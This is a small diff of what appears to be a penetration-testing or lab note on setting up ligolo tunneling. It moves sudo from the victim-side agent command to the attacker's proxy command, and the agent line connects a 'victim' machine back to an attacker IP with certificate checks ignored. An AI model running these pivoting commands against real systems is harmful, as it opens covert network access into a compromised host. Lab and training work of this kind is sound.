@@ -4,12 +4,12 @@ sudo ip tuntap add user root mode tun ligolo
 
 sudo ip link set ligolo up
 
-~/tools/ligolo/proxy -selfcert
+sudo ~/tools/ligolo/proxy -selfcert
 ```
 
 on the victim:
 ```bash
-sudo ./agent -connect 10.10.17.138:11601 -ignore-cert
+./agent -connect 10.10.17.138:11601 -ignore-cert
 
 # attacker_ip:port_of_ligolo
 ```
